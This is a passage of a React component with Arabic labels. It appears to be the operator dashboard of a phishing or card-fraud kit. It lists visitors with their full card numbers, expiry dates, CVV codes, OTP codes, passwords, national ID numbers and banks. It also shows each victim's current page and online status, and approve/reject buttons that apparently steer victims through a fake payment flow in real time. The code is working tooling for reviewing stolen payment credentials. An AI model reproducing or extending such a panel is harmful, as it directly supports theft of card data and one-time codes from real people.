                    <RefreshCw
                      className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
                    />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <div className="hidden md:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setSettingsOpen(true)}
                    >
                      <Settings className="h-4 w-4" />
                      <span className="sr-only">الإعدادات</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setExportDialogOpen(true)}
                    >
                      <Download className="h-4 w-4" />
                      <span className="sr-only">تصدير</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="hidden sm:flex items-center gap-2"
              >
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>
            </div>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button
                  variant="ghost"
                  className="relative h-10 w-10 rounded-full"
                >
                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
                    <AvatarImage
                      src="/placeholder.svg?height=40&width=40"
                      alt="صورة المستخدم"
                    />
                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-white">
                      مد
                    </AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>
                  <div className="flex flex-col space-y-1">
                    <p className="text-sm font-medium">مدير النظام</p>
                    <p className="text-xs text-muted-foreground">
                      admin@example.com
                    </p>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                  <Settings className="ml-2 h-4 w-4" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                  <Download className="ml-2 h-4 w-4" />
                  تصدير البيانات
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onClick={handleLogout}
                  className="text-red-600"
                >
                  <LogOut className="ml-2 h-4 w-4" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Enhanced Statistics Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <StatisticsCard
            title="إجمالي الزوار"
            value={totalVisitorsCount}
            change="+12%"
            changeType="increase"
            icon={Users}
            color="bg-gradient-to-br from-blue-500 to-blue-600"
            trend={visitorTrend}
          />
          <StatisticsCard
            title="المستخدمين المتصلين"
            value={onlineUsersCount}
            change="+5%"
            changeType="increase"
            icon={UserCheck}
            color="bg-gradient-to-br from-green-500 to-green-600"
            trend={onlineTrend}
          />
          <StatisticsCard
            title="معلومات البطاقات"
            value={cardSubmissionsCount}
            change="+8%"
            changeType="increase"
            icon={CreditCard}
            color="bg-gradient-to-br from-purple-500 to-purple-600"
            trend={cardTrend}
          />
          <StatisticsCard
            title="الموافقات"
            value={approvedCount}
            change="+15%"
            changeType="increase"
            icon={CheckCircle}
            color="bg-gradient-to-br from-emerald-500 to-emerald-600"
            trend={approvedTrend}
          />
        </div>

        {/* Enhanced Main Content */}
        <Card className="bg-card/50 backdrop-blur-sm border-0 shadow-xl">
          <CardHeader className="pb-4">
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
              <div>
                <CardTitle className="text-2xl font-bold flex items-center gap-3">
                  <Activity className="h-6 w-6 text-primary" />
                  إدارة الإشعارات
                </CardTitle>
                <CardDescription className="mt-1">
                  عرض وإدارة جميع الإشعارات والبيانات المستلمة
                </CardDescription>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <SearchBar onSearch={handleSearch} />
                <div className="flex gap-2">
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2">
                        <Filter className="h-4 w-4" />
                        فلترة
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setFilterType("all")}>
                        جميع الإشعارات
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("card")}>
                        البطاقات فقط
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("online")}>
                        المتصلين فقط
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>

                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="outline" size="sm" className="gap-2">
                        <ArrowUpDown className="h-4 w-4" />
                        ترتيب
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setSortBy("date")}>
                        حسب التاريخ
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("status")}>
                        حسب الحالة
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("country")}>
                        حسب الدولة
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </div>
            </div>

            {/* Filter Tabs */}
            <div className="flex flex-wrap gap-2 mt-4">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                size="sm"
                className="gap-2"
              >
                الكل
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {notifications.length}
                </Badge>
              </Button>
              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                size="sm"
                className="gap-2"
              >
                <CreditCard className="h-4 w-4" />
                البطاقات
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {cardSubmissionsCount}
                </Badge>
              </Button>
              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                size="sm"
                className="gap-2"
              >
                <UserCheck className="h-4 w-4" />
                المتصلين
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {onlineUsersCount}
                </Badge>
              </Button>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            {/* Desktop Table View */}
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b bg-muted/30">
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                      الدولة
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                      المعلومات
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                      الحالة
                    </th>
                    <th className="px-6 py-4 text-right font-semibold text-muted-foreground">
                      الوقت
                    </th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
                      الاتصال
                    </th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
                      الكود
                    </th>
                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">
                      الإجراءات
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification, index) => (
                    <tr key={notification.id}>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                            <MapPin className="h-4 w-4 text-primary" />
                          </div>
                          <span className="font-medium">
                            {notification.country || "غير معروف"}
                          </span>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={
                              notification?.password ? "default" : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification?.password
                                ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "personal")
                            }
                          >
                            <User className="h-3 w-3 mr-1" />
                            {notification?.password
                              ? "معلومات شخصية"
                              : "لا يوجد معلومات"}
                          </Badge>
                          <Badge
                            variant={
                              notification.cardNumber ? "default" : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.cardNumber
                                ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "card")
                            }
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardNumber
                              ? "معلومات البطاقة"
                              : "لا يوجد بطاقة"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        {notification.status === "approved" ? (
                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                            <CheckCircle className="h-3 w-3 mr-1" />
                            موافق عليه
                          </Badge>
                        ) : notification.status === "rejected" ? (
                          <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                            <XCircle className="h-3 w-3 mr-1" />
                            مرفوض
                          </Badge>
                        ) : (
                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                            <Clock className="h-3 w-3 mr-1" />
                            قيد المراجعة
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
                          <Clock className="h-4 w-4" />
                          {notification.createdDate &&
                            formatDistanceToNow(
                              new Date(notification.createdDate),
                              {
                                addSuffix: true,
                                locale: ar,
                              }
                            )}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-6 py-4 text-center">
                        {notification.otp && (
                          <Badge
                            variant="outline"
                            className="bg-blue-50 text-blue-700 border-blue-200"
                          >
                            {notification.otp}
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex justify-center gap-1">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() =>
                                    handleApproval("approved", notification.id)
                                  }
                                  className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
                                  disabled={notification.status === "approved"}
                                >
                                  <CheckCircle className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>موافقة</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() =>
                                    handleApproval("rejected", notification.id)
                                  }
                                  className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
                                  disabled={notification.status === "rejected"}
                                >
                                  <XCircle className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>رفض</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => handleDelete(notification.id)}
                                  className="text-red-500 hover:text-red-600 hover:bg-red-50"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>حذف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <Badge>{notification?.currentPage}</Badge>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="lg:hidden space-y-4 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id}>
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                          <MapPin className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <p className="font-semibold">
                            {notification.country || "غير معروف"}
                          </p>
                          <p className="text-sm text-muted-foreground">
                            {notification.createdDate &&
                              formatDistanceToNow(
                                new Date(notification.createdDate),
                                {
                                  addSuffix: true,
                                  locale: ar,
                                }
                              )}
                          </p>
                        </div>
                      </div>
                      <UserStatus userId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-0">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.userName ? "default" : "secondary"}
                          className={`cursor-pointer ${
                            notification.userName
                              ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                              : ""
                          }`}
                          onClick={() =>
                            handleInfoClick(notification, "personal")
                          }
                        >
                          <User className="h-3 w-3 mr-1" />
                          {notification.userName
                            ? "معلومات شخصية"
                            : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={
                            notification.cardNumber ? "default" : "secondary"
                          }
                          className={`cursor-pointer ${
                            notification.cardNumber
                              ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          {notification.cardNumber
                            ? "معلومات البطاقة"
                            : "لا يوجد بطاقة"}
                        </Badge>
                      </div>

                      <div className="flex justify-between items-center">
                        <div className="flex items-center gap-2">
                          <span className="text-sm text-muted-foreground">
                            الحالة:
                          </span>
                          {notification.status === "approved" ? (
                            <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                              <CheckCircle className="h-3 w-3 mr-1" />
                              موافق عليه
                            </Badge>
                          ) : notification.status === "rejected" ? (
                            <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                              <XCircle className="h-3 w-3 mr-1" />
                              مرفوض
                            </Badge>
                          ) : (
                            <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                              <Clock className="h-3 w-3 mr-1" />
                              قيد المراجعة
                            </Badge>
                          )}
                        </div>
                        {notification.otp && (
                          <Badge
                            variant="outline"
                            className="bg-blue-50 text-blue-700"
                          >
                            {notification.otp}
                          </Badge>
                        )}
                      </div>

                      <div className="flex gap-2 pt-2 border-t">
                        <Button
                          onClick={() =>
                            handleApproval("approved", notification.id)
                          }
                          className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                          size="sm"
                          disabled={notification.status === "approved"}
                        >
                          <CheckCircle className="h-4 w-4 mr-1" />
                          موافقة
                        </Button>
                        <Button
                          onClick={() =>
                            handleApproval("rejected", notification.id)
                          }
                          className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700"
                          size="sm"
                          disabled={notification.status === "rejected"}
                        >
                          <XCircle className="h-4 w-4 mr-1" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-500 hover:text-red-600 hover:bg-red-50"
                          size="sm"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>

                        <Badge>{notification?.currentPage}</Badge>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Empty State */}
            {paginatedNotifications.length === 0 && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
                  <Bell className="h-8 w-8 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold mb-2">لا توجد إشعارات</h3>
                <p className="text-muted-foreground">
                  لا توجد إشعارات متطابقة مع الفلتر المحدد
                </p>
              </div>
            )}
          </CardContent>

          {/* Enhanced Pagination */}
          {filteredNotifications.length > 0 && (
            <CardFooter className="border-t bg-muted/20 p-4">
              <Pagination
                currentPage={currentPage}
                totalPages={totalPages}
                onPageChange={handlePageChange}
                totalItems={filteredNotifications.length}
                itemsPerPage={itemsPerPage}
              />
            </CardFooter>
          )}
        </Card>
      </div>

      {/* Enhanced Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center">
                    <CreditCard className="h-5 w-5 text-white" />
                  </div>
                  معلومات البطاقة
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "الاسم", value: selectedNotification.userName },
                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                  {
                    label: "البريد الإلكتروني",
                    value: selectedNotification.email,
                  },
                  { label: "رقم الجوال", value: selectedNotification.password },
                  { label: "الهاتف", value: selectedNotification.phone },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">
                          {label}:
                        </span>
                        <span className="font-semibold" dir="ltr">{value}</span>
                      </div>
                    )
                )}
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
               { label: "البنك", value: selectedNotification.bank },
                  {
                    label: "رقم البطاقة",
                    value: selectedNotification?.cardNumber ,
                  },
                  {
                    label: "تاريخ الانتهاء",
                    value:
                      selectedNotification.year && selectedNotification.month
                        ? `${selectedNotification.year}/${selectedNotification.month}`
                        : selectedNotification.expiaryDate,
                  },
                  { label: "رمز الأمان", value: selectedNotification.cvv },
                  { label: "رمز التحقق", value: selectedNotification.otp },
                  { label: "كلمة المرور", value: selectedNotification.pass },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">
                          {label}:
                        </span>
                        <span className="font-semibold">{value}</span>
                      </div>
                    )
                )}
                {selectedNotification.allOtps &&
                  Array.isArray(selectedNotification.allOtps) &&
                  selectedNotification.allOtps.length > 0 && (
                    <div className="pt-2 border-t border-border/30">
                      <span className="font-medium text-muted-foreground block mb-2">
                        جميع الرموز:
                      </span>
                      <div className="flex flex-wrap gap-2">
                        {selectedNotification.allOtps.map((otp, index) => (
                          <Badge
                            key={index}
                            variant="outline"
                            className="bg-muted"
                          >
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
